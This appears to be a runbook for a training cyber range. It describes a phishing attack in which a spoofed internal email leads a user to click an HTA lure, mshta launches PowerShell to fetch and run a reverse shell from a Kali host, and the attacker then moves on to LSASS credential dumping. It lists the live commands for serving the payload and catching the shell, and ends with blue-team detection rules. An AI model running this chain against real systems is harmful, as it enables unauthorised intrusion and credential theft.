# GP-0 — Phishing initial access (Kali → shell on RAC)

The highlighted entry: Red (Kali) emails the `RemoteIT` mailbox (delivery target only). On RAC, White is logged into Windows as a **privileged domain account** (local admin on RAC) and opens Thunderbird to read that mailbox. White clicks the lure → a reverse shell lands on RAC **in that admin context**, so it can immediately dump LSASS and recover the resident `svc_backup` hash (GP-1) — no privilege-escalation step required.

> Note: `RemoteIT` is just the email address. The Windows interactive user is a separate admin domain account that White signs in as for the drill; that is where the shell's privilege comes from.

## Flow

```
Kali 10.5.20.50                           Mail 10.4.20.21            RAC 10.5.20.10 (RemoteIT via Thunderbird)
  phish_email.py  --SMTP:25 (hdr From admin)-->  hMailServer  --IMAP-->  Thunderbird inbox
  http.server:8080 (HTA + s.ps1)  <----click "Run Mailbox Security Update" (mshta)----  teacher clicks
  nc -lvnp 4444   <------------------- PowerShell reverse shell (s.ps1) -------------------  RAC
```

1. `phish_email.py` delivers the lure. Header `From: admin@mail.np.local` (displays as internal); envelope sender is external so hMailServer accepts it unauthenticated (proven: test T2).
2. Lure links to `http://10.5.20.50:8080/Mailbox_Security_Update.hta`.
3. Teacher clicks → `mshta` runs the HTA → launches `powershell` that downloads+executes `s.ps1` (the reverse shell, `revshell.ps1`) from Kali.
4. `s.ps1` connects back to the Kali listener on 4444 → interactive shell as RemoteIT on RAC.

## Files

| File | Role |
|---|---|
| phish_email.py | Sends the lure from Kali (--real for the live subject; default = [DRILLTEST] preview) |
| Mailbox_Security_Update.hta | Clickable lure payload (served on Kali :8080) → runs the staged PS |
| revshell.ps1 | The reverse shell, served as s.ps1 on Kali :8080 |

## Running the live click test (on Kali)

```bash
cd /home/kali/drill/web && python3 -m http.server 8080 &     # serve HTA + s.ps1
nc -lvnp 4444 &                                              # catch the shell
python3 /home/kali/drill/phish_email.py --real               # send the real lure
# teacher opens Thunderbird as RemoteIT, clicks the button -> shell appears on 4444
```

## Blue detection (for the guide)

- Mail: `index=mail` — inbound from a non-`mail.np.local` sender, header-From mismatch (phishing).
- Host (RAC, Sysmon): `mshta.exe` spawning `powershell.exe` with `DownloadString` → EC1; outbound to 10.5.20.50:4444 → EC3. Classic lure-execution chain.
- Network: Suricata/Zeek — HTTP fetch of `.hta`/`.ps1` from 10.5.20.50, then the 4444 reverse-shell stream.